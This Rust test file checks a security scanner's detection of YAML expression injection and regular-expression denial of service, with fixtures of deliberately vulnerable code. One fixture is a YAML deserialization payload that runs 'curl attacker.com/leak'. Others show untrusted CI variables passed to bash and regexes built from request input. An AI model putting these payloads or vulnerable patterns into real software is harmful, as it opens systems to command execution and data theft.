use bug_killer::scanner::injection::InjectionScanner;
use bug_killer::types::*;
use std::path::Path;

#[test]
fn test_yaml_expr_injection_gitlab_ci_untrusted_variable() {
    let path = Path::new(".gitlab-ci.yml");
    let content = r#"
stages:
  - test

test_job:
  stage: test
  script:
    - echo "Testing commit: $CI_COMMIT_TITLE"
    - bash -c "echo $CI_COMMIT_DESCRIPTION"
"#;

    let findings = InjectionScanner::scan_yaml_expr_injection(path, content);
    assert!(
        !findings.is_empty(),
        "Expected finding for untrusted GitLab variable in script"
    );

    let f = &findings[0];
    assert_eq!(f.cve.as_str(), "BK-AI-INJ-014");
    assert_eq!(f.category, "2.1 Injection and interpreter boundaries");
    assert!(f.severity == Severity::Critical || f.severity == Severity::High);
}

#[test]
fn test_yaml_expr_injection_python_deserialization_tag() {
    let path = Path::new("config/pipeline.yaml");
    let content = r#"
runtime:
  handler: !!python/object/apply:os.system ["curl attacker.com/leak"]
"#;

    let findings = InjectionScanner::scan_yaml_expr_injection(path, content);
    assert!(
        !findings.is_empty(),
        "Expected finding for unsafe YAML object apply tag"
    );

    let f = findings
        .iter()
        .find(|f| f.cve.as_str() == "BK-AI-INJ-014")
        .expect("Must have BK-AI-INJ-014 finding");
    assert_eq!(f.cve.as_str(), "BK-AI-INJ-014");
}

#[test]
fn test_yaml_expr_injection_ansible_pipe_lookup() {
    let path = Path::new("playbooks/deploy.yml");
    let content = r#"
- hosts: all
  tasks:
    - name: Run arbitrary command
      debug:
        msg: "{{ lookup('pipe', user_input) }}"
"#;

    let findings = InjectionScanner::scan_yaml_expr_injection(path, content);
    assert!(
        !findings.is_empty(),
        "Expected finding for unsafe pipe lookup in YAML"
    );
    assert_eq!(findings[0].cve.as_str(), "BK-AI-INJ-014");
}

#[test]
fn test_yaml_expr_injection_safe_yaml_no_false_positive() {
    let path = Path::new("deploy/k8s.yaml");
    let content = r#"
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
spec:
  replicas: 3
  template:
    metadata:
      labels:
        app: web
    spec:
      containers:
      - name: nginx
        image: nginx:1.25.3
        ports:
        - containerPort: 80
"#;

    let findings = InjectionScanner::scan_yaml_expr_injection(path, content);
    assert!(
        findings.is_empty(),
        "Safe Kubernetes YAML must produce no findings"
    );
}

#[test]
fn test_yaml_expr_injection_skips_github_workflows() {
    let path = Path::new(".github/workflows/build.yml");
    let content = r#"
name: Build
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$CI_COMMIT_TITLE"
"#;

    // GitHub workflows are scanned by CicdScanner (BK-AI-CIC-001), so non-github YAML scanner ignores them
    let findings = InjectionScanner::scan_yaml_expr_injection(path, content);
    assert!(
        findings.is_empty(),
        "scan_yaml_expr_injection must skip GitHub Actions workflows"
    );
}

#[test]
fn test_redos_js_new_regexp_user_input() {
    let path = Path::new("src/routes/search.js");
    let content = r#"
app.get("/search", (req, res) => {
    const userInput = req.query.q;
    const regex = new RegExp(userInput, "g");
    const results = items.filter(i => regex.test(i.name));
    res.json(results);
});
"#;

    let findings = InjectionScanner::scan_redos(path, content);
    assert!(
        !findings.is_empty(),
        "Expected ReDoS finding for new RegExp(userInput)"
    );

    let f = &findings[0];
    assert_eq!(f.cve.as_str(), "BK-AI-INJ-015");
    assert_eq!(f.category, "2.1 Injection and interpreter boundaries");
    assert_eq!(f.severity, Severity::High);
}

#[test]
fn test_redos_python_re_compile_user_input() {
    let path = Path::new("app/views.py");
    let content = r#"
import re

def filter_items(request):
    pattern = request.GET.get('pattern')
    compiled = re.compile(pattern)
    return [x for x in data if compiled.search(x)]
"#;

    let findings = InjectionScanner::scan_redos(path, content);
    assert!(
        !findings.is_empty(),
        "Expected ReDoS finding for re.compile(pattern)"
    );

    let f = &findings[0];
    assert_eq!(f.cve.as_str(), "BK-AI-INJ-015");
}

#[test]
fn test_redos_catastrophic_backtracking_pattern() {
    let path = Path::new("src/validator.ts");
    let content = r#"
const emailRegex = new RegExp("([a-zA-Z0-9]+)+$");
export function validate(input: string) {
    return emailRegex.test(input);
}
"#;

    let findings = InjectionScanner::scan_redos(path, content);
    assert!(
        !findings.is_empty(),
        "Expected ReDoS finding for nested quantifier catastrophic pattern"
    );
    assert_eq!(findings[0].cve.as_str(), "BK-AI-INJ-015");
}

#[test]
fn test_redos_safe_regex_literal_no_false_positive() {
    let js_path = Path::new("src/utils.js");
    let js_content = r#"
const safeRegex = new RegExp("^[a-zA-Z0-9_-]+$", "i");
const literalRegex = /^[0-9]+$/;
"#;
    let js_findings = InjectionScanner::scan_redos(js_path, js_content);
    assert!(
        js_findings.is_empty(),
        "Safe static RegExp literals must produce no findings"
    );

    let py_path = Path::new("app/utils.py");
    let py_content = r#"
import re
SAFE_PATTERN = re.compile(r"^[a-zA-Z0-9]+$")
"#;
    let py_findings = InjectionScanner::scan_redos(py_path, py_content);
    assert!(
        py_findings.is_empty(),
        "Safe static Python re.compile must produce no findings"
    );
}
